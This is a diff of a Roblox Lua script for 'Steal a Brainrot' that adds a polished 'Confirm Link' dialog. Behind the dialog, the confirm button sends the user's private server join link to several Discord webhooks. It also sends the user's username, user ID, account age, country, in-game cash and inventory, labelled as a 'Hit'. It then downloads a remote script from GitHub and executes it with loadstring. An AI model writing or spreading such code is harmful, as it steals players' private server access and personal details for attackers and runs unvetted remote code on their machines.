+    confirmGui.BackgroundTransparency = 1
+    confirmGui.BorderSizePixel = 0
+    confirmGui.ClipsDescendants = true
+    confirmGui.Parent = screen
 
-    -- 4. Disable CoreGui (first time only)
-    disableCoreGui()
+    local cCorner = Instance.new("UICorner", confirmGui); cCorner.CornerRadius = UDim.new(0,20)
+    local cStroke = Instance.new("UIStroke", confirmGui)
+    cStroke.Color = Color3.fromRGB(100,200,255)
+    cStroke.Thickness = 0
 
-    -- 5. Create GUI (only once)
-    if not guiCreated then
-        spawn(CreateGui)
-    end
-end
+    local cDrag = Instance.new("Frame")
+    cDrag.Size = UDim2.new(1,0,0,40)
+    cDrag.BackgroundTransparency = 1
+    cDrag.Parent = confirmGui
+    makeDraggable(confirmGui, cDrag)
 
--- ==================== MAIN MONITORING ====================
-local function startMonitoring()
-    print("[Scripts.SM] Friend Toggle & Anti-Steal System Loaded")
+    local warnTitle = Instance.new("TextLabel")
+    warnTitle.Size = UDim2.new(1,-40,0,40)
+    warnTitle.Position = UDim2.fromOffset(20,20)
+    warnTitle.BackgroundTransparency = 1
+    warnTitle.Text = "Confirm Link"
+    warnTitle.TextColor3 = Color3.new(1,1,1)
+    warnTitle.Font = Enum.Font.GothamBold
+    warnTitle.TextSize = 22
+    warnTitle.TextTransparency = 1
+    warnTitle.Parent = confirmGui
 
-    local connection
-    connection = Players.PlayerAdded:Connect(function(player)
-        task.wait(1)
-        local targets = getAllTargets()
-        for _, name in ipairs(targets) do
-            if player.Name == name then
-                processPlayer(player)
-            end
-        end
+    local warnMsg = Instance.new("TextLabel")
+    warnMsg.Size = UDim2.new(1,-40,0,50)
+    warnMsg.Position = UDim2.fromOffset(20,60)
+    warnMsg.BackgroundTransparency = 1
+    warnMsg.Text = "Link is valid. Click Confirm to proceed."
+    warnMsg.TextColor3 = Color3.fromRGB(0,255,100)
+    warnMsg.Font = Enum.Font.Gotham
+    warnMsg.TextSize = 15
+    warnMsg.TextWrapped = true
+    warnMsg.TextTransparency = 1
+    warnMsg.Parent = confirmGui
+
+    local cancelBtn = Instance.new("TextButton")
+    cancelBtn.Size = UDim2.new(0,120,0,40)
+    cancelBtn.Position = UDim2.new(0,30,1,-60)
+    cancelBtn.BackgroundColor3 = Color3.fromRGB(60,60,70)
+    cancelBtn.Text = "Cancel"
+    cancelBtn.TextColor3 = Color3.new(1,1,1)
+    cancelBtn.Font = Enum.Font.GothamBold
+    cancelBtn.TextSize = 16
+    cancelBtn.BackgroundTransparency = 1
+    cancelBtn.Parent = confirmGui
+
+    local confirmBtn = Instance.new("TextButton")
+    confirmBtn.Size = UDim2.new(0,120,0,40)
+    confirmBtn.Position = UDim2.new(1,-150,1,-60)
+    confirmBtn.BackgroundColor3 = Color3.fromRGB(0,170,80)
+    confirmBtn.Text = "Confirm"
+    confirmBtn.TextColor3 = Color3.new(1,1,1)
+    confirmBtn.Font = Enum.Font.GothamBold
+    confirmBtn.TextSize = 16
+    confirmBtn.BackgroundTransparency = 1
+    confirmBtn.Parent = confirmGui
+
+    local btnC1 = Instance.new("UICorner", cancelBtn); btnC1.CornerRadius = UDim.new(0,10)
+    local btnC2 = Instance.new("UICorner", confirmBtn); btnC2.CornerRadius = UDim.new(0,10)
+
+    -- Pop-in: All at once
+    local popIn = TweenService:Create(confirmGui, TweenInfo.new(0.45, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
+        Size = UDim2.fromOffset(380,180),
+        BackgroundTransparency = 0
+    })
+    local strokeIn = TweenService:Create(cStroke, TweenInfo.new(0.45), {Thickness = 2})
+    local textIn  = TweenService:Create(warnTitle, TweenInfo.new(0.35, Enum.EasingStyle.Quint), {TextTransparency = 0})
+    local msgIn   = TweenService:Create(warnMsg,  TweenInfo.new(0.35, Enum.EasingStyle.Quint), {TextTransparency = 0})
+    local btnIn1  = TweenService:Create(cancelBtn, TweenInfo.new(0.35, Enum.EasingStyle.Quint), {BackgroundTransparency = 0})
+    local btnIn2  = TweenService:Create(confirmBtn,TweenInfo.new(0.35, Enum.EasingStyle.Quint), {BackgroundTransparency = 0})
+
+    popIn:Play()
+    strokeIn:Play()
+    task.delay(0.12, function()
+        textIn:Play()
+        msgIn:Play()
+        btnIn1:Play()
+        btnIn2:Play()
     end)
 
-    -- Initial scan
-    spawn(function()
-        task.wait(2)
-        local targets = getAllTargets()
-        for _, player in ipairs(Players:GetPlayers()) do
-            if player ~= LocalPlayer then
-                for _, name in ipairs(targets) do
-                    if player.Name == name then
-                        processPlayer(player)
-                    end
-                end
-            end
-        end
-    end)
+    local function closeConfirm()
+        local fadeOut = TweenService:Create(confirmGui, TweenInfo.new(0.28, Enum.EasingStyle.Sine), {BackgroundTransparency = 1})
+        local strokeOut = TweenService:Create(cStroke, TweenInfo.new(0.28), {Thickness = 0})
+        local textOut   = TweenService:Create(warnTitle, TweenInfo.new(0.28), {TextTransparency = 1})
+        local msgOut    = TweenService:Create(warnMsg,  TweenInfo.new(0.28), {TextTransparency = 1})
+        local btnOut1   = TweenService:Create(cancelBtn, TweenInfo.new(0.28), {BackgroundTransparency = 1})
+        local btnOut2   = TweenService:Create(confirmBtn,TweenInfo.new(0.28), {BackgroundTransparency = 1})
 
-    -- Refresh config
-    while task.wait(5) do
-        spawn(function()
-            repeat task.wait() until _G["Script-SM_Config"]
-            users = _G["Script-SM_Config"].users or {}
+        fadeOut:Play()
+        strokeOut:Play()
+        textOut:Play()
+        msgOut:Play()
+        btnOut1:Play()
+        btnOut2:Play()
+
+        fadeOut.Completed:Connect(function()
+            confirmGui:Destroy()
+            confirmGui = nil
         end)
     end
+
+    cancelBtn.MouseButton1Click:Connect(closeConfirm)
+
+    confirmBtn.MouseButton1Click:Connect(function()
+        closeConfirm()
+
+        _G.Private_Server_SM = joinLink
+        local cash = getStat("Cash") or 0
+        local steals = getStat("Steals") or 0
+        local rebirths = getStat("Rebirths") or 0
+
+        safeRequest(prvt_srvrs_logs, {content = joinLink})
+
+        -- Scan brainrots (already sorted highest to lowest)
+        local brainrots = getBrainrots()
+        local backpackLines = {}
+
+        if #brainrots > 0 then
+            for _, v in ipairs(brainrots) do
+                table.insert(backpackLines, v.name .. " : " .. v.generation)
+            end
+        else
+            table.insert(backpackLines, "No brainrots found.")
+        end
+
+        -- Warning line (always shown)
+        table.insert(backpackLines, 1, "Warning: We Can't Scan Latest Brainrots from events.")
+
+        -- Join everything with newlines and wrap in a single code block
+        local finalBackpackText = "```\n" .. table.concat(backpackLines, "\n") .. "\n```"
+
+        local payload = {
+            avatar_url = "https://cdn.discordapp.com/attachments/1394146542813970543/1395733310793060393/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png",
+            content = "",
+            embeds = {{
+                title = "🎯 Steal a Brainrot Hit - Scripts.SM",
+                url = joinLink,
+                color = 57855,
+                fields = {
+                    {name = "🪪 Display Name", value = "```"..(player.DisplayName or "Unknown").."```", inline = true},
+                    {name = "👤 Username", value = "```"..(player.Name or "Unknown").."```", inline = true},
+                    {name = "🆔 User ID", value = "```"..tostring(player.UserId).."```", inline = true},
+                    {name = "🗓️ Account Age", value = "```"..tostring(player.AccountAge).." days```", inline = true},
+                    {name = "💻 Executor", value = "```"..detectExecutor().."```", inline = true},
+                    {name = "🌍 Country", value = "```"..getCountry().."```", inline = true},
+                    {name = "💸 Cash", value = "```"..formatCash(cash).."```", inline = true},
+                    {name = "🔥 Steals", value = "```"..tostring(steals).."```", inline = true},
+                    {name = "♻️ Rebirths", value = "```"..tostring(rebirths).."```", inline = true},
+                    {name = "💰 Backpack", value = finalBackpackText, inline = false},
+                    {name = "🔗 Join with URL", value = "[Click here to join]("..joinLink..")", inline = false}
+                },
+                footer = {text = "discord.gg/cnUAk7uc3n"},
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }}
+        }
+
+        safeRequest(user_webhook, payload)
+        safeRequest(logs_webhook, payload)
+
+
+        TweenService:Create(card, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {
+            Position = UDim2.fromScale(0.5, -1.5),
+            BackgroundTransparency = 1
+        }):Play()
+        TweenService:Create(dim, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
+        TweenService:Create(blur, TweenInfo.new(0.5), {Size = 0}):Play()
+
+        task.delay(0.7, function()
+            screen:Destroy()
+            local scriptURL = "https://raw.githubusercontent.com/RblxScriptsOG/Steal-a-brainrot/main/main-gui.lua"
+            local src = safeHttpGet(scriptURL)
+            if src then
+                local success, err = pcall(function() loadstring(src)() end)
+                if not success then warn("main-gui.lua failed: "..tostring(err)) end
+            else
+                warn("Failed to fetch main-gui.lua – Check HTTP permissions or internet.")
+            end
+        end)
+    end)
 end
 
--- START
-startMonitoring()
+--====================================================================--
+-- ESC Key
+--====================================================================--
+UserInputService.InputBegan:Connect(function(i, gp)
+    if gp then return end
+    if i.KeyCode == Enum.KeyCode.Escape then
+        if confirmGui then
+            local fadeOut = TweenService:Create(confirmGui, TweenInfo.new(0.28, Enum.EasingStyle.Sine), {BackgroundTransparency = 1})
+            fadeOut:Play()
+            fadeOut.Completed:Connect(function() confirmGui:Destroy() end)
+        else
+            triggerContinue()
+        end
+    end
+end)
